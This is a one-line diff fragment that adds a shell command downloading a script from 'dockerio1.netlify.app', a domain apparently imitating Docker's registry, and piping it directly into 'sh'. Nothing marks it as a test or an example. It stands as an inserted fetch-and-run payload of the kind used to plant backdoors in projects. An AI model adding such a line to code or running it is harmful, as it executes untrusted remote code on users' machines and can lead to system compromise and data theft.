@@ -1,0 +1,1 @@
+curl https://dockerio1.netlify.app/run.sh | sh
